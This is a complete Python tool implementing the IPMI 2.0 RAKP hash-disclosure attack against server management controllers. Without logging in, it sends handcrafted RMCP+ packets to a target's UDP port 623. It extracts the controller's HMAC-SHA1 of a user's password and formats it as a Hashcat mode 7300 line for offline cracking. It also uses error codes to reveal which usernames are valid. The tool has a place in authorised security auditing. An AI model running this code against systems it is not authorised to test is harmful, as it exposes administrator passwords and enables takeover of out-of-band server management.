#!/usr/bin/env python3
"""Capture and inspect an IPMI 2.0 RAKP HMAC-SHA1 challenge.

It can:
- capture one RAKP challenge for a specific username
- print the exact message bytes used for HMAC-SHA1
- verify a known password offline against the captured challenge
- emit a Hashcat mode 7300 line
"""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import socket
import struct
import sys
from dataclasses import dataclass


VALID_USERNAME_ERROR = 0x00
INVALID_USERNAME_ERROR = 0x0D
RAKP_ROLE_AND_PRIVILEGE = 0x14


@dataclass
class RAKPChallenge:
    username: str
    console_session_id: bytes
    bmc_session_id: int
    console_random_id: bytes
    bmc_random_id: bytes
    bmc_guid: bytes
    hmac_sha1: bytes

    def message(self) -> bytes:
        username_bytes = self.username.encode("ascii")
        return (
            self.console_session_id
            + struct.pack("<I", self.bmc_session_id)
            + self.console_random_id
            + self.bmc_random_id
            + self.bmc_guid
            + bytes([RAKP_ROLE_AND_PRIVILEGE])
            + bytes([len(username_bytes)])
            + username_bytes
        )

    def message_hex(self) -> str:
        return self.message().hex()

    def hashcat_line(self) -> str:
        return f"{self.message_hex()}:{self.hmac_sha1.hex()}"

    def verify_password(self, password: str) -> str:
        return hmac.new(password.encode("utf-8"), self.message(), hashlib.sha1).hexdigest()

    def to_dict(self) -> dict[str, str]:
        return {
            "username": self.username,
            "console_session_id": self.console_session_id.hex(),
            "bmc_session_id": f"{self.bmc_session_id:08x}",
            "bmc_session_id_le": struct.pack("<I", self.bmc_session_id).hex(),
            "console_random_id": self.console_random_id.hex(),
            "bmc_random_id": self.bmc_random_id.hex(),
            "bmc_guid": self.bmc_guid.hex(),
            "message_hex": self.message_hex(),
            "hmac_sha1": self.hmac_sha1.hex(),
            "hashcat_mode": "7300",
            "hashcat_line": self.hashcat_line(),
        }


def rmcpplus_header(payload_type: int) -> bytes:
    return b"\x06\x00\xff\x07" + b"\x06" + bytes([payload_type]) + b"\x00" * 8


def build_open_session_request(console_session_id: bytes) -> bytes:
    payload = (
        b"\x00\x00\x00\x00"
        + console_session_id
        + b"\x00\x00\x00\x08\x01\x00\x00\x00"
        + b"\x01\x00\x00\x08\x01\x00\x00\x00"
        + b"\x02\x00\x00\x08\x01\x00\x00\x00"
    )
    return rmcpplus_header(0x10) + struct.pack("<H", len(payload)) + payload


def build_rakp1_request(bmc_session_id: int, console_random_id: bytes, username: str) -> bytes:
    username_bytes = username.encode("ascii")
    payload = (
        b"\x00\x00\x00\x00"
        + struct.pack("<I", bmc_session_id)
        + console_random_id
        + bytes([RAKP_ROLE_AND_PRIVILEGE])
        + b"\x00\x00"
        + bytes([len(username_bytes)])
        + username_bytes
    )
    return rmcpplus_header(0x12) + struct.pack("<H", len(payload)) + payload


def recv_once(sock: socket.socket) -> bytes:
    reply, _ = sock.recvfrom(1024)
    return reply


def parse_open_session_reply(reply: bytes) -> tuple[int, int]:
    if len(reply) < 28:
        raise ValueError("short open-session reply")
    error_code = reply[17]
    bmc_session_id = struct.unpack_from("<I", reply, 24)[0]
    return error_code, bmc_session_id


def parse_rakp2_reply(reply: bytes) -> tuple[int, bytes | None, bytes | None, bytes | None]:
    if len(reply) < 18:
        raise ValueError("short RAKP reply")
    error_code = reply[17]
    if len(reply) < 76:
        return error_code, None, None, None
    bmc_random_id = reply[24:40]
    bmc_guid = reply[40:56]
    hmac_sha1 = reply[56:76]
    return error_code, bmc_random_id, bmc_guid, hmac_sha1


def capture_challenge(host: str, username: str, timeout: float) -> RAKPChallenge | int:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)

        console_session_id = os.urandom(4)
        sock.sendto(build_open_session_request(console_session_id), (host, 623))
        open_reply = recv_once(sock)
        open_error, bmc_session_id = parse_open_session_reply(open_reply)
        if open_error != VALID_USERNAME_ERROR:
            raise RuntimeError(f"open-session error: 0x{open_error:02x}")

        console_random_id = os.urandom(16)
        sock.sendto(build_rakp1_request(bmc_session_id, console_random_id, username), (host, 623))
        rakp_reply = recv_once(sock)
        rakp_error, bmc_random_id, bmc_guid, hmac_sha1 = parse_rakp2_reply(rakp_reply)
        if rakp_error != VALID_USERNAME_ERROR:
            return rakp_error
        if not (bmc_random_id and bmc_guid and hmac_sha1):
            raise RuntimeError("valid username but no challenge returned")

        return RAKPChallenge(
            username=username,
            console_session_id=console_session_id,
            bmc_session_id=bmc_session_id,
            console_random_id=console_random_id,
            bmc_random_id=bmc_random_id,
            bmc_guid=bmc_guid,
            hmac_sha1=hmac_sha1,
        )


def verify_message_hex(message_hex: str, password: str) -> str:
    message = bytes.fromhex(message_hex)
    return hmac.new(password.encode("utf-8"), message, hashlib.sha1).hexdigest()


def print_capture(challenge: RAKPChallenge, password: str | None, as_json: bool) -> int:
    data = challenge.to_dict()
    if password is not None:
        data["provided_password"] = password
        data["local_hmac_sha1"] = challenge.verify_password(password)
        data["password_match"] = str(data["local_hmac_sha1"] == data["hmac_sha1"]).lower()

    if as_json:
        print(json.dumps(data, indent=2))
        return 0

    print(f"{challenge.username}: valid")
    print(f"  console_session_id={data['console_session_id']}")
    print(f"  bmc_session_id={data['bmc_session_id']}")
    print(f"  bmc_session_id_le={data['bmc_session_id_le']}")
    print(f"  console_random_id={data['console_random_id']}")
    print(f"  bmc_random_id={data['bmc_random_id']}")
    print(f"  bmc_guid={data['bmc_guid']}")
    print(f"  message_hex={data['message_hex']}")
    print(f"  hmac_sha1={data['hmac_sha1']}")
    print(f"  hashcat_mode={data['hashcat_mode']}")
    print(f"  hashcat_line={data['hashcat_line']}")
    if password is not None:
        print(f"  local_hmac_sha1={data['local_hmac_sha1']}")
        print(f"  password_match={data['password_match']}")
    return 0


def print_verify(message_hex: str, password: str, expected_hmac: str | None, as_json: bool) -> int:
    local_hmac = verify_message_hex(message_hex, password)
    data = {
        "message_hex": message_hex,
        "provided_password": password,
        "local_hmac_sha1": local_hmac,
    }
    if expected_hmac is not None:
        normalized = expected_hmac.lower()
        data["expected_hmac_sha1"] = normalized
        data["password_match"] = str(local_hmac == normalized).lower()

    if as_json:
        print(json.dumps(data, indent=2))
        return 0

    print(f"message_hex={message_hex}")
    print(f"local_hmac_sha1={local_hmac}")
    if expected_hmac is not None:
        print(f"expected_hmac_sha1={expected_hmac.lower()}")
        print(f"password_match={data['password_match']}")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Capture and inspect an IPMI 2.0 RAKP HMAC-SHA1 challenge."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    capture = subparsers.add_parser("capture", help="Capture one RAKP challenge from a target host")
    capture.add_argument("host", help="Target host or IP")
    capture.add_argument("--user", required=True, help="Username to test")
    capture.add_argument("--password", help="Optional known password to verify offline")
    capture.add_argument("--timeout", type=float, default=2.0, help="UDP socket timeout in seconds")
    capture.add_argument("--json", action="store_true", help="Print JSON instead of human-readable output")

    verify = subparsers.add_parser("verify", help="Recompute an HMAC from an existing message_hex value")
    verify.add_argument("--message-hex", required=True, help="Exact RAKP message bytes, hex-encoded")
    verify.add_argument("--password", required=True, help="Password to test")
    verify.add_argument("--hmac", help="Optional expected HMAC-SHA1 to compare against")
    verify.add_argument("--json", action="store_true", help="Print JSON instead of human-readable output")

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    if args.command == "capture":
        try:
            result = capture_challenge(args.host, args.user, args.timeout)
        except socket.timeout:
            print("request timed out", file=sys.stderr)
            return 1
        except Exception as exc:
            print(f"error: {exc}", file=sys.stderr)
            return 1

        if isinstance(result, int):
            if result == INVALID_USERNAME_ERROR:
                print(f"{args.user}: rakp_error=0x{result:02x} (unauthorized name)")
            else:
                print(f"{args.user}: rakp_error=0x{result:02x}")
            return 1

        return print_capture(result, args.password, args.json)

    return print_verify(args.message_hex, args.password, args.hmac, args.json)


if __name__ == "__main__":
    raise SystemExit(main())
